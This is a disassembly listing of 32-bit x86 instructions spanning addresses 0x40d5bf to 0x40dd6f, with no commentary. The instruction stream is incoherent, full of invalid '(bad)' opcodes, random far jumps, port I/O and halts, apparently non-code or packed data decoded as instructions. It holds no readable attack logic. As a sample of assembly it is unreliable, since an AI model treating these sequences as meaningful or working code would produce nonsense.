  40d5bf:	jl     0x40d5dd
  40d5c1:	test   DWORD PTR [edi+0x4e98e65],ecx
  40d5c7:	rol    BYTE PTR [ebp+0x4f],0x3d
  40d5cb:	jmp    0xf55e:0xe2782c2a
  40d5d2:	push   edi
  40d5d3:	(bad)  
  40d5d4:	jmp    0xa8996aa3
  40d5d9:	sti    
  40d5da:	idiv   BYTE PTR [esi-0x22df0d7a]
  40d5e0:	(bad)  
  40d5e1:	cmp    esp,edx
  40d5e3:	sub    BYTE PTR [edx+0x23e8c1e3],0x78
  40d5ea:	sbb    BYTE PTR [ebp+0x1dd93d1a],cl
  40d5f0:	test   DWORD PTR [esi+0x3b],esp
  40d5f3:	jae    0x40d642
  40d5f5:	mov    ecx,0x354fbd80
  40d5fa:	in     al,0x7c
  40d5fc:	or     ebx,DWORD PTR [edx+0x7f8f0bda]
  40d602:	pop    edx
  40d603:	std    
  40d604:	(bad)  
  40d605:	mov    edx,0x5dc8aa6b
  40d60a:	inc    esi
  40d60b:	inc    esi
  40d60c:	dec    esp
  40d60d:	cmp    ebp,DWORD PTR [esi+0x55]
  40d610:	(bad)  
  40d612:	jp     0x40d625
  40d614:	call   0xd954:0x9261f535
  40d61b:	test   eax,0x243509ea
  40d620:	mov    ds:0xc19f23d2,eax
  40d625:	mov    ch,0x39
  40d627:	xchg   edx,eax
  40d628:	cmp    cl,ah
  40d62a:	(bad)  
  40d62b:	jns    0x40d60a
  40d62d:	cmp    eax,0xebe57009
  40d632:	ja     0x40d5b6
  40d634:	hlt    
  40d635:	imul   edx,esp,0x64
  40d638:	out    0x98,eax
  40d63a:	and    esi,DWORD PTR [esi-0x40]
  40d63d:	fbstp  TBYTE PTR [eax-0x34]
  40d640:	gs retf 0x69b8
  40d644:	aam    0x57
  40d646:	fimul  DWORD PTR [eax+ebp*8+0x71416058]
  40d64d:	mov    ecx,0x2481fcf2
  40d652:	(bad)  
  40d654:	aas    
  40d655:	sahf   
  40d656:	jg     0x40d698
  40d658:	pop    edx
  40d659:	ror    DWORD PTR [eax+0x3015c420],cl
  40d65f:	jo     0x40d658
  40d661:	inc    edi
  40d662:	push   esp
  40d663:	xchg   DWORD PTR [ebp-0x6e],ebp
  40d666:	mov    DWORD PTR [edi-0x55],eax
  40d669:	mov    eax,0xb90541ee
  40d66e:	(bad)  
  40d670:	or     DWORD PTR [ecx-0x5370ad13],ebx
  40d676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d677:	sub    BYTE PTR [ebx+eiz*8-0x76],bh
  40d67b:	fidiv  DWORD PTR [eax]
  40d67d:	out    dx,eax
  40d67e:	adc    al,BYTE PTR [esi-0x61fa5f39]
  40d684:	test   BYTE PTR [edi-0x4f],dl
  40d687:	sbb    al,0xc4
  40d689:	jecxz  0x40d634
  40d68b:	mov    bh,BYTE PTR [esi+ebx*2]
  40d68e:	call   0x74808336
  40d693:	retf   0x5baa
  40d696:	retf   
  40d697:	pop    ebp
  40d698:	(bad)  
  40d699:	aam    0xdd
  40d69b:	(bad)  
  40d69d:	scas   eax,DWORD PTR es:[edi]
  40d69e:	leave  
  40d69f:	loopne 0x40d6ab
  40d6a1:	inc    esi
  40d6a2:	mov    WORD PTR [edx+0x34],gs
  40d6a5:	repz pop edx
  40d6a7:	rol    esp,1
  40d6a9:	mov    BYTE PTR [edi+0x6],dh
  40d6ac:	jecxz  0x40d65d
  40d6ae:	imul   ebx,DWORD PTR ss:[edx+0x58],0x5e296d26
  40d6b6:	retf   
  40d6b7:	xchg   ebp,eax
  40d6b8:	pop    ds
  40d6b9:	test   DWORD PTR [ebp+0x735d6478],esi
  40d6bf:	and    bl,BYTE PTR [esp+eax*4]
  40d6c2:	in     eax,0xc6
  40d6c4:	inc    edi
  40d6c5:	inc    esi
  40d6c6:	rcpps  xmm5,XMMWORD PTR [edx]
  40d6c9:	cwde   
  40d6ca:	mov    ds:0x180dd502,eax
  40d6cf:	jne    0x40d67b
  40d6d1:	sbb    eax,0xf3b12ee8
  40d6d6:	add    ecx,DWORD PTR [edi-0x5c]
  40d6d9:	hlt    
  40d6da:	jnp    0x40d70b
  40d6dc:	push   es
  40d6dd:	outs   dx,DWORD PTR ds:[esi]
  40d6de:	push   es
  40d6df:	gs pop ss
  40d6e1:	scas   al,BYTE PTR es:[edi]
  40d6e2:	stos   BYTE PTR es:[edi],al
  40d6e3:	outs   dx,DWORD PTR ds:[esi]
  40d6e4:	mov    bh,0xb5
  40d6e6:	retf   0x2b94
  40d6e9:	call   0xe0ee:0x921df1a4
  40d6f0:	out    0x8d,eax
  40d6f2:	shl    DWORD PTR [ebx],1
  40d6f4:	mov    edx,0xb610ecda
  40d6f9:	xchg   esp,eax
  40d6fa:	scas   al,BYTE PTR es:[edi]
  40d6fb:	xor    DWORD PTR [ecx-0x3a],ebx
  40d6fe:	stc    
  40d6ff:	addr16 daa 
  40d701:	lds    ebx,FWORD PTR [edi-0x6bc998e7]
  40d707:	sbb    DWORD PTR [ecx],esi
  40d709:	pop    ss
  40d70a:	add    cl,bh
  40d70c:	jmp    0xd3eb2c51
  40d711:	inc    eax
  40d712:	or     DWORD PTR [eax],esi
  40d714:	imul   esi,DWORD PTR [esi+0xe60d844],0xfffffffc
  40d71b:	add    eax,0xb48ee5b8
  40d720:	xchg   DWORD PTR [eax],ecx
  40d722:	sti    
  40d723:	scas   eax,DWORD PTR es:[edi]
  40d724:	inc    esi
  40d725:	mov    dl,0x60
  40d727:	push   es
  40d728:	mov    bh,0x5f
  40d72a:	outs   dx,DWORD PTR ds:[esi]
  40d72b:	cmp    esp,DWORD PTR [ebp+0xe]
  40d72e:	fimul  WORD PTR [ebx+0x70]
  40d731:	aaa    
  40d732:	nop
  40d733:	xchg   edx,eax
  40d734:	push   ss
  40d735:	jp     0x40d771
  40d737:	pusha  
  40d738:	sbb    DWORD PTR [ebx],0x5b
  40d73b:	xchg   ecx,eax
  40d73c:	imul   edi,ebp,0xffffffe6
  40d73f:	mov    edx,0x1ac47270
  40d744:	jbe    0x40d7af
  40d746:	test   DWORD PTR [ecx-0x54],esi
  40d749:	ins    BYTE PTR es:[edi],dx
  40d74a:	inc    eax
  40d74b:	add    esp,DWORD PTR [esi]
  40d74d:	pop    ecx
  40d74e:	aad    0x3f
  40d750:	mov    ds:0x9f6a830b,eax
  40d755:	inc    edi
  40d756:	ret    0x59bc
  40d759:	enter  0x24b2,0x9d
  40d75d:	or     eax,0xf7fcb158
  40d762:	mov    dh,0x9b
  40d764:	pop    ebp
  40d765:	pop    ds
  40d766:	add    BYTE PTR [eax-0x6a],cl
  40d769:	or     eax,0xdc8fae17
  40d76e:	cmp    al,0x5a
  40d770:	jmp    0x9b006a38
  40d775:	adc    BYTE PTR [ebx+0x71f6741e],ah
  40d77b:	hlt    
  40d77c:	mov    BYTE PTR [edi+0x366d9daa],0x69
  40d783:	adc    bl,dh
  40d785:	aaa    
  40d786:	call   0x8ffa:0xc78681c3
  40d78d:	push   ecx
  40d78e:	push   ecx
  40d78f:	call   0x6be7:0x7b1c1d1c
  40d796:	stc    
  40d797:	fs sahf 
  40d799:	lea    esp,[ebp+0x9440060]
  40d79f:	jp     0x40d812
  40d7a1:	xor    eax,0xb044cf00
  40d7a6:	jl     0x40d77f
  40d7a8:	stc    
  40d7a9:	push   ebx
  40d7aa:	call   0x2d0b276e
  40d7af:	inc    esi
  40d7b0:	ficom  DWORD PTR [esi+edx*1-0x4845639b]
  40d7b7:	daa    
  40d7b8:	retf   0xf428
  40d7bb:	mov    ebx,0x2e0956c8
  40d7c0:	or     al,0x37
  40d7c2:	pusha  
  40d7c3:	add    BYTE PTR [ebp-0x350bd108],ah
  40d7c9:	sbb    al,0x4d
  40d7cb:	sbb    dl,bl
  40d7cd:	push   edi
  40d7ce:	lock gs or eax,0x928fd5f6
  40d7d5:	ins    DWORD PTR es:[edi],dx
  40d7d6:	xchg   BYTE PTR [eax+esi*1-0x7c660a0e],cl
  40d7dd:	mov    ebx,0xbf674a9d
  40d7e2:	cli    
  40d7e3:	inc    esi
  40d7e4:	pop    esp
  40d7e5:	pop    esi
  40d7e6:	sahf   
  40d7e7:	mov    ah,0xbd
  40d7e9:	push   ds
  40d7ea:	xor    esi,DWORD PTR [ebx]
  40d7ec:	test   al,0xd2
  40d7ee:	aam    0xad
  40d7f0:	repz push ebp
  40d7f2:	pusha  
  40d7f3:	dec    edx
  40d7f4:	stos   BYTE PTR es:[edi],al
  40d7f5:	pop    edx
  40d7f6:	push   es
  40d7f7:	leave  
  40d7f8:	pop    es
  40d7f9:	pop    eax
  40d7fa:	inc    ebp
  40d7fb:	sub    ecx,DWORD PTR [edi]
  40d7fd:	js     0x40d874
  40d7ff:	push   eax
  40d800:	inc    edx
  40d801:	(bad)  
  40d802:	pop    edx
  40d803:	pop    ecx
  40d804:	pop    ebx
  40d805:	sbb    esi,0x3b
  40d808:	mov    bh,0x52
  40d80a:	push   0xb33e8e6e
  40d80f:	and    esi,DWORD PTR [ebp-0x4bf6c5a5]
  40d815:	aam    0x6e
  40d817:	add    DWORD PTR [esi+0x1b],0x1719c51f
  40d81e:	ret    
  40d81f:	mov    bh,0xd9
  40d821:	mov    esp,0x3303f1da
  40d826:	cdq    
  40d827:	jmp    0x40d7e0
  40d829:	aam    0x3f
  40d82b:	rcr    DWORD PTR [edx-0x7d],cl
  40d82e:	add    DWORD PTR [edi-0x60],esp
  40d831:	mov    cl,0xe9
  40d833:	mov    ebx,edi
  40d835:	mov    ah,ah
  40d837:	(bad)  
  40d838:	sbb    bl,BYTE PTR [eax+edx*4]
  40d83b:	inc    edx
  40d83c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d83d:	or     dl,BYTE PTR [ebp-0x36d79dbf]
  40d843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d844:	js     0x40d7da
  40d846:	sbb    BYTE PTR [edi-0x6c],dh
  40d849:	fst    DWORD PTR [eax+eiz*8]
  40d84c:	jmp    0xb1fefee3
  40d851:	cmp    ah,ah
  40d853:	mov    eax,ds:0x9e029a65
  40d858:	xchg   esp,eax
  40d859:	jecxz  0x40d8b2
  40d85b:	into   
  40d85c:	aas    
  40d85d:	mov    ah,0x43
  40d85f:	mov    ds:0x79a8d07f,eax
  40d864:	push   eax
  40d865:	jns    0x40d89d
  40d867:	sbb    edx,esi
  40d869:	add    DWORD PTR [edi],ecx
  40d86b:	xchg   ecx,eax
  40d86c:	mov    esp,0x6c5446fb
  40d871:	(bad)  
  40d872:	imul   DWORD PTR [eax+0x4768e68c]
  40d878:	ror    BYTE PTR [ecx+0x1a],1
  40d87b:	shl    DWORD PTR [esi+0x45d925cb],1
  40d881:	pop    ecx
  40d882:	js     0x40d832
  40d884:	call   0xa19f7282
  40d889:	mov    edi,0xdc21589b
  40d88e:	mov    ebx,0xbe5568ee
  40d893:	popa   
  40d894:	pop    ds
  40d895:	(bad)  
  40d896:	inc    ebp
  40d897:	xchg   DWORD PTR [edx+0x2c20b2a6],esi
  40d89d:	cmp    BYTE PTR [edi],0xef
  40d8a0:	fbld   TBYTE PTR [edi+0x72]
  40d8a3:	xchg   ecx,eax
  40d8a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8a5:	rcr    ebx,1
  40d8a7:	mov    esi,0x88863f8a
  40d8ac:	jno    0x40d84b
  40d8ae:	pop    es
  40d8af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8b0:	test   eax,0x6f599b52
  40d8b5:	inc    edx
  40d8b6:	mov    ds:0xe70115d,al
  40d8bb:	jg     0x40d90a
  40d8bd:	add    BYTE PTR [ecx-0x1df9abfb],ah
  40d8c3:	fdiv   DWORD PTR [edi]
  40d8c5:	mov    bh,BYTE PTR [ecx]
  40d8c7:	dec    esp
  40d8c8:	inc    esp
  40d8c9:	fild   WORD PTR [esi-0x23]
  40d8cc:	fisttp QWORD PTR [esi-0x4f009258]
  40d8d2:	loop   0x40d926
  40d8d4:	test   al,0xae
  40d8d6:	pop    es
  40d8d7:	dec    ebp
  40d8d8:	(bad)  
  40d8d9:	push   esi
  40d8da:	mov    al,ds:0xbdc0745f
  40d8df:	xlat   BYTE PTR ds:[ebx]
  40d8e0:	enter  0x2549,0xfc
  40d8e4:	aas    
  40d8e5:	rcr    bh,cl
  40d8e7:	lods   eax,DWORD PTR ds:[esi]
  40d8e8:	ss ins BYTE PTR es:[edi],dx
  40d8ea:	in     al,0x86
  40d8ec:	cdq    
  40d8ed:	out    0xd0,eax
  40d8ef:	shl    DWORD PTR ds:0xc106397,0xa7
  40d8f6:	jmp    0x1174:0x783e92c1
  40d8fd:	or     eax,0x5bd6b2ff
  40d902:	cmp    eax,0xcb009cc0
  40d907:	arpl   WORD PTR [ecx],sp
  40d909:	mov    ebx,0x8ebc8baa
  40d90e:	xchg   esp,eax
  40d90f:	mov    ds:0x952e7364,eax
  40d914:	and    ecx,DWORD PTR [ebx-0x56]
  40d917:	rcl    DWORD PTR [esi-0x2b],cl
  40d91a:	ss push esp
  40d91c:	addr16 cld 
  40d91e:	jg     0x40d996
  40d920:	mov    DWORD PTR [edx-0x30fbf23c],0xfbfb9993
  40d92a:	test   BYTE PTR [edx+0xf23978e],bh
  40d930:	dec    esp
  40d931:	mov    al,0xc1
  40d933:	test   eax,0x83909610
  40d938:	xchg   ch,cl
  40d93a:	fidiv  WORD PTR [ebx+0x1e]
  40d93d:	scas   eax,DWORD PTR es:[edi]
  40d93e:	cmp    eax,0x5e506955
  40d943:	aaa    
  40d944:	sub    dh,dh
  40d946:	cmc    
  40d947:	sbb    ch,BYTE PTR [esi+0x2a]
  40d94a:	js     0x40d8d9
  40d94c:	xchg   esi,eax
  40d94d:	(bad)  
  40d94e:	xor    al,0x53
  40d950:	inc    BYTE PTR [esi-0x31]
  40d953:	sbb    BYTE PTR [ecx],0xe5
  40d956:	call   0x34ed:0x6ca2e153
  40d95d:	int    0x88
  40d95f:	outs   dx,BYTE PTR ds:[esi]
  40d960:	imul   ebx,ebx,0x3f
  40d963:	adc    dh,cl
  40d965:	inc    edx
  40d966:	adc    al,dl
  40d968:	push   ss
  40d969:	sbb    edi,ebp
  40d96b:	div    BYTE PTR [ecx]
  40d96d:	arpl   di,bp
  40d96f:	std    
  40d970:	nop
  40d971:	add    eax,0xf73909aa
  40d976:	arpl   ax,bp
  40d978:	inc    esp
  40d97a:	arpl   ax,dx
  40d97c:	jnp    0x40d91d
  40d97e:	data16 mov ds:0x469a7f2c,al
  40d984:	pop    ecx
  40d985:	(bad)  
  40d986:	icebp  
  40d987:	and    edx,DWORD PTR ds:0xd8328c22
  40d98d:	or     eax,0x3f9722a5
  40d992:	icebp  
  40d993:	in     eax,0x18
  40d995:	outs   dx,DWORD PTR ds:[esi]
  40d996:	sub    DWORD PTR [edx-0x5ec05],edx
  40d99c:	xchg   ebx,eax
  40d99d:	jno    0x40d982
  40d99f:	adc    bh,BYTE PTR [ecx]
  40d9a1:	pop    esp
  40d9a2:	sbb    ecx,DWORD PTR [edi]
  40d9a4:	mov    ah,0x79
  40d9a6:	sbb    edx,0xffffffe9
  40d9a9:	pop    ds
  40d9aa:	test   eax,esp
  40d9ac:	mov    ?,ebx
  40d9ae:	push   ecx
  40d9af:	ficom  DWORD PTR [edi]
  40d9b1:	test   eax,0x66ff6723
  40d9b6:	inc    edi
  40d9b7:	(bad)  
  40d9b8:	dec    ecx
  40d9b9:	inc    ecx
  40d9ba:	adc    al,0x56
  40d9bc:	xor    al,0xf1
  40d9be:	push   edi
  40d9bf:	loopne 0x40d9ac
  40d9c1:	(bad)  
  40d9c2:	pop    ebp
  40d9c3:	popa   
  40d9c4:	int3   
  40d9c5:	shl    DWORD PTR [esi+ebp*4+0x72],1
  40d9c9:	(bad)  
  40d9ca:	popf   
  40d9cb:	out    0x42,eax
  40d9cd:	les    ebx,FWORD PTR [ecx-0x1c]
  40d9d0:	xchg   BYTE PTR [ebx+0x531e7885],dh
  40d9d6:	mov    eax,0xbe48c920
  40d9db:	ins    DWORD PTR es:[edi],dx
  40d9dc:	call   0xfaa43d15
  40d9e1:	mov    bh,0x15
  40d9e3:	in     al,dx
  40d9e4:	and    dl,dh
  40d9e6:	pop    ebp
  40d9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9e8:	pop    edx
  40d9e9:	cmp    BYTE PTR [ecx+eiz*4-0x5718f3c8],ah
  40d9f0:	xchg   ebx,eax
  40d9f1:	adc    al,0x50
  40d9f3:	cs (bad) 
  40d9f6:	cmp    al,0xec
  40d9f8:	inc    ebx
  40d9f9:	sub    eax,0x3d9e48a0
  40d9fe:	repnz pop ecx
  40da00:	test   DWORD PTR [edx],0xc43a20e0
  40da06:	ret    0x6114
  40da09:	mov    al,0x28
  40da0b:	das    
  40da0c:	sti    
  40da0d:	cld    
  40da0e:	mov    edx,0x5de0aab7
  40da13:	fwait
  40da14:	or     BYTE PTR ds:0xed44bc1a,dh
  40da1a:	jne    0x40da39
  40da1c:	xchg   ebp,eax
  40da1d:	mov    dh,0x20
  40da1f:	bound  edx,QWORD PTR [ecx+0x1cea98c7]
  40da25:	mov    ebx,0xb28de997
  40da2a:	cmp    BYTE PTR [eax+edi*4],0xfd
  40da2e:	jbe    0x40d9bf
  40da30:	arpl   WORD PTR [esi+0x6a],si
  40da33:	and    BYTE PTR [edx],ch
  40da35:	jb     0x40da6f
  40da37:	(bad)  
  40da38:	jo     0x40da21
  40da3a:	fst    QWORD PTR [ebp+0x323672db]
  40da40:	add    al,0xc2
  40da42:	dec    ebp
  40da43:	dec    edx
  40da44:	test   eax,0xafaf9f50
  40da49:	push   cs
  40da4a:	(bad)  
  40da4b:	addr16 in al,dx
  40da4d:	sub    DWORD PTR [ebx+0x4ea3c6cf],esp
  40da53:	fstp   DWORD PTR [eax]
  40da55:	iret   
  40da56:	mov    ecx,0x49ab2608
  40da5b:	fsub   QWORD PTR [eax+0x68185121]
  40da61:	sahf   
  40da62:	jnp    0x40da92
  40da64:	jbe    0x40d9ff
  40da66:	xor    BYTE PTR [eax-0x480a539c],bh
  40da6c:	cmp    DWORD PTR [eax+0x2e],ecx
  40da6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da70:	fwait
  40da71:	repz arpl WORD PTR [edi+0x28778c31],cx
  40da78:	add    DWORD PTR [edx+esi*2+0x2e13c68e],edx
  40da7f:	cmp    eax,0x16406756
  40da84:	xor    ah,BYTE PTR [ecx]
  40da86:	and    BYTE PTR [edx-0x21f02c71],0x9
  40da8d:	jecxz  0x40dadc
  40da8f:	jns    0x40da9b
  40da91:	sub    al,0x74
  40da93:	mov    ebp,0xa51b06d8
  40da98:	mov    esp,0xd92864a1
  40da9d:	add    eax,0xde6ef6e1
  40daa2:	cdq    
  40daa3:	pop    ecx
  40daa4:	pop    eax
  40daa5:	xor    dh,BYTE PTR [eax]
  40daa7:	cwde   
  40daa8:	sbb    ah,BYTE PTR [edx+0x34f092c7]
  40daae:	lahf   
  40daaf:	xor    eax,0x92ced59b
  40dab4:	test   eax,0x56c26222
  40dab9:	sbb    dl,BYTE PTR [edi]
  40dabb:	add    al,0xad
  40dabd:	mov    ebx,0x78a32276
  40dac2:	fcom   QWORD PTR [esp+esi*8+0x79]
  40dac6:	stos   BYTE PTR es:[edi],al
  40dac7:	jmp    0x1a04:0x7b7a56b5
  40dace:	retf   
  40dacf:	scas   al,BYTE PTR es:[edi]
  40dad0:	cmovge esi,DWORD PTR [ebx+0x42]
  40dad4:	inc    edi
  40dad5:	cmc    
  40dad6:	xor    eax,0xaef1d761
  40dadb:	jg     0x40da69
  40dadd:	or     dl,ch
  40dadf:	mov    dh,0xc1
  40dae1:	xchg   edx,eax
  40dae2:	xchg   ebx,ebx
  40dae4:	mov    ebx,0x9dd60ee0
  40dae9:	data16 jb 0x40da87
  40daec:	stc    
  40daed:	retf   0xc89b
  40daf0:	fdivrp st(0),st
  40daf2:	inc    esi
  40daf3:	sub    eax,0x549ef1a0
  40daf8:	sub    ecx,DWORD PTR [esi-0xaaf943]
  40dafe:	pushf  
  40daff:	jns    0x40daa9
  40db01:	mov    esp,0xb3e1bc7e
  40db06:	xor    bl,BYTE PTR [ebx]
  40db08:	outs   dx,BYTE PTR ds:[esi]
  40db09:	inc    ebp
  40db0a:	inc    ebx
  40db0b:	xchg   edi,eax
  40db0c:	adc    al,0x2
  40db0e:	mov    ah,0x2d
  40db10:	jb     0x40dad2
  40db12:	jmp    0x243ac8b1
  40db17:	push   ebp
  40db18:	daa    
  40db19:	mov    es,edx
  40db1b:	cmp    cl,BYTE PTR [ecx+edi*2-0x23cf5a4b]
  40db22:	pop    ss
  40db23:	adc    DWORD PTR [eax+0x2521f5a5],ecx
  40db29:	pop    esp
  40db2a:	push   ss
  40db2b:	sub    eax,0x26630f7
  40db30:	mov    ?,WORD PTR [esi-0x3a]
  40db33:	adc    al,0x85
  40db35:	pop    ss
  40db36:	inc    esp
  40db37:	je     0x40db06
  40db39:	clc    
  40db3a:	cs jle 0x40db14
  40db3d:	or     al,0xf7
  40db3f:	fcom   DWORD PTR [ecx-0x3b0f04c5]
  40db45:	mov    al,ds:0x1d1283d1
  40db4a:	scas   al,BYTE PTR es:[edi]
  40db4b:	jns    0x40db99
  40db4d:	pushf  
  40db4e:	inc    esi
  40db4f:	jne    0x40db85
  40db51:	aas    
  40db52:	nop
  40db53:	mov    BYTE PTR [edx-0x25dd1e99],0x72
  40db5a:	pop    edi
  40db5b:	in     al,dx
  40db5c:	popa   
  40db5d:	jmp    DWORD PTR [ebx-0x45b52836]
  40db63:	mov    ds:0x319e66dc,eax
  40db68:	pop    es
  40db69:	imul   ebp,DWORD PTR [ecx],0xffffffbe
  40db6c:	mov    eax,ds:0x616e152f
  40db71:	fbld   TBYTE PTR [ebx-0x1a1d6612]
  40db77:	sub    BYTE PTR [ebp+edi*4+0x4],cl
  40db7b:	push   es
  40db7c:	mov    fs,WORD PTR [ebx+eiz*4+0x132834c]
  40db83:	xchg   ebx,eax
  40db84:	popf   
  40db85:	sbb    BYTE PTR [ecx-0x27],al
  40db88:	(bad)  
  40db89:	scas   eax,DWORD PTR es:[di]
  40db8b:	pusha  
  40db8c:	leave  
  40db8d:	xor    BYTE PTR [ebx-0x67b27b58],cl
  40db93:	ficomp DWORD PTR [esi+0x50]
  40db96:	enter  0x422,0xfd
  40db9a:	fstp   DWORD PTR [eax-0x7b]
  40db9d:	popa   
  40db9e:	adc    eax,DWORD PTR [edx]
  40dba0:	inc    ebp
  40dba1:	sub    esi,DWORD PTR [ebx]
  40dba3:	adc    al,0x82
  40dba5:	pop    esi
  40dba6:	inc    ecx
  40dba7:	pop    ss
  40dba8:	and    DWORD PTR [ecx+0x33],ecx
  40dbab:	mov    edx,DWORD PTR [ecx]
  40dbad:	sub    eax,0xb35f9446
  40dbb2:	ds loop 0x40dc26
  40dbb5:	test   BYTE PTR [ecx-0x734cc869],dl
  40dbbb:	data16 ja 0x40dbf2
  40dbbe:	lds    esi,FWORD PTR [edi]
  40dbc0:	or     BYTE PTR [esi-0x739bd2a3],0x8a
  40dbc7:	fmul   QWORD PTR [edx+0x7c]
  40dbca:	test   DWORD PTR ds:[edx+esi*4+0x33],esp
  40dbcf:	mov    al,ds:0xc805b11f
  40dbd4:	dec    ebx
  40dbd5:	(bad)  
  40dbd6:	xor    BYTE PTR [edi-0x241717fc],0x1e
  40dbdd:	out    dx,eax
  40dbde:	pop    edi
  40dbdf:	xchg   edi,eax
  40dbe0:	test   eax,0x9a62d0b5
  40dbe5:	shr    BYTE PTR [ebx+0x48259911],0x44
  40dbec:	push   es
  40dbed:	mov    fs,WORD PTR [eax-0x2abfa4ba]
  40dbf3:	pop    es
  40dbf4:	inc    ebx
  40dbf5:	adc    BYTE PTR [edx+ebx*8],0x9e
  40dbf9:	(bad)  
  40dbfa:	imul   eax,DWORD PTR [esi],0xc2bc89a
  40dc00:	in     al,dx
  40dc01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc02:	rcr    BYTE PTR ds:0x2870e706,0x8a
  40dc09:	push   cs
  40dc0a:	push   ecx
  40dc0b:	inc    edx
  40dc0c:	sub    eax,0x4f83b45c
  40dc11:	jmp    FWORD PTR [ecx-0x39378ea1]
  40dc17:	jb     0x40dc90
  40dc19:	dec    ecx
  40dc1a:	pop    edx
  40dc1b:	ret    
  40dc1c:	pop    ds
  40dc1d:	inc    ebx
  40dc1e:	dec    eax
  40dc1f:	call   0x89446452
  40dc24:	outs   dx,BYTE PTR ds:[esi]
  40dc25:	or     esp,edi
  40dc27:	fdivr  QWORD PTR [edx-0x3cffb34f]
  40dc2d:	(bad)  
  40dc2e:	sub    edi,DWORD PTR [ecx-0x374a0a39]
  40dc34:	sub    DWORD PTR [esi],eax
  40dc36:	mov    esi,0xabcd40ba
  40dc3b:	xchg   edx,eax
  40dc3c:	rol    DWORD PTR [esi+ebx*4-0x3d9bc1f7],1
  40dc43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc44:	out    dx,eax
  40dc45:	mov    ds:0xb7cfd9c4,al
  40dc4a:	pop    es
  40dc4b:	push   esp
  40dc4c:	dec    DWORD PTR gs:[edi]
  40dc4f:	loop   0x40dbd3
  40dc51:	repz mov ebp,0xd9e66fce
  40dc57:	popa   
  40dc58:	loope  0x40dc24
  40dc5a:	and    ebp,ebx
  40dc5c:	jae    0x40dc1c
  40dc5e:	push   ds
  40dc5f:	jne    0x40dc07
  40dc61:	mov    bl,0x57
  40dc63:	fmul   QWORD PTR [ecx+0x16]
  40dc66:	js     0x40dcda
  40dc68:	and    DWORD PTR [edx],0x951cea6d
  40dc6e:	sbb    DWORD PTR ds:0x86032c04,ecx
  40dc74:	sbb    BYTE PTR [eax-0x4925f2ba],dh
  40dc7a:	and    al,0xaa
  40dc7c:	cwde   
  40dc7d:	mov    dh,0xfa
  40dc7f:	and    esi,DWORD PTR [edx+0x4bba6c4c]
  40dc85:	mov    ebp,0x1f4afc62
  40dc8a:	pop    ebx
  40dc8b:	test   sp,cx
  40dc8e:	loopne 0x40dc72
  40dc90:	ss jns 0x40dc4a
  40dc93:	enter  0x402d,0x58
  40dc97:	add    BYTE PTR [edx],bh
  40dc99:	sbb    eax,0x1f769cd9
  40dc9e:	sbb    eax,0xb5981a6c
  40dca3:	in     al,dx
  40dca4:	data16 aaa 
  40dca6:	sub    BYTE PTR [ecx-0x1e],al
  40dca9:	sbb    eax,0xdc9a7920
  40dcae:	scas   eax,DWORD PTR es:[edi]
  40dcaf:	je     0x40dc4b
  40dcb1:	sbb    ecx,DWORD PTR [edx-0x14]
  40dcb4:	cli    
  40dcb5:	fucomip st,st(3)
  40dcb7:	jp     0x40dc62
  40dcb9:	loopne 0x40dc83
  40dcbb:	push   ecx
  40dcbc:	xchg   edx,esp
  40dcbe:	or     dh,BYTE PTR [ebp-0x7b]
  40dcc1:	adc    BYTE PTR [edx],dh
  40dcc3:	adc    BYTE PTR [ebp+0x54],dl
  40dcc6:	push   esp
  40dcc7:	xchg   ecx,eax
  40dcc8:	mov    al,ds:0xc9138812
  40dccd:	sub    BYTE PTR [ebp-0x44],ah
  40dcd0:	xchg   esp,eax
  40dcd1:	xor    eax,0x6839097a
  40dcd6:	inc    esi
  40dcd7:	aas    
  40dcd8:	fstp   DWORD PTR [ecx+0x3d97bac4]
  40dcde:	into   
  40dcdf:	div    BYTE PTR [esi]
  40dce1:	inc    edx
  40dce2:	loope  0x40dcbe
  40dce4:	or     al,0x48
  40dce6:	mov    bl,0xa3
  40dce8:	sbb    BYTE PTR [ecx+edx*1-0x698d50ec],0xa1
  40dcf0:	scas   eax,DWORD PTR es:[edi]
  40dcf1:	(bad)  
  40dcf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcf3:	xor    al,0x44
  40dcf5:	popa   
  40dcf6:	sbb    BYTE PTR [ecx-0x42],al
  40dcf9:	scas   al,BYTE PTR es:[edi]
  40dcfa:	push   ds
  40dcfb:	cwde   
  40dcfc:	fsubr  QWORD PTR [ecx]
  40dcfe:	cmp    ebx,0x1c2defba
  40dd04:	cld    
  40dd05:	cmp    DWORD PTR [ebx+ecx*2-0x323a4b70],0xf300135a
  40dd10:	std    
  40dd11:	je     0x40dd7b
  40dd13:	xor    al,0x2b
  40dd15:	mov    ?,WORD PTR [ebx-0x747924d8]
  40dd1b:	imul   BYTE PTR [ebx]
  40dd1d:	dec    eax
  40dd1e:	ja     0x40dcfd
  40dd20:	rol    BYTE PTR [ecx],cl
  40dd22:	sar    DWORD PTR [edi+edx*2],1
  40dd25:	mov    al,0xcb
  40dd27:	sbb    BYTE PTR ds:0x9e4b23de,dh
  40dd2d:	in     al,0xe8
  40dd2f:	xor    ch,bh
  40dd31:	mov    dl,0x2c
  40dd33:	jmp    0x40dd11
  40dd35:	call   0x8b2bce2
  40dd3a:	das    
  40dd3b:	pop    eax
  40dd3c:	xlat   BYTE PTR ds:[ebx]
  40dd3d:	(bad)  
  40dd3e:	aam    0xb2
  40dd40:	int    0x2b
  40dd42:	sub    al,0x23
  40dd44:	mov    ebx,0x69ec69ca
  40dd49:	hlt    
  40dd4a:	and    BYTE PTR [ecx-0x24c87e2b],al
  40dd50:	repz inc ecx
  40dd52:	sbb    eax,0xd256f37d
  40dd57:	stos   BYTE PTR es:[edi],al
  40dd58:	mov    eax,ds:0xebdc18c7
  40dd5d:	into   
  40dd5e:	and    BYTE PTR [esi],dh
  40dd60:	pop    esp
  40dd61:	jno    0x40dd5b
  40dd63:	pop    es
  40dd64:	cmp    BYTE PTR [ecx+0x64d103b7],bl
  40dd6a:	sub    eax,0x127f322b
  40dd6f:	mov    eax,0x573add62
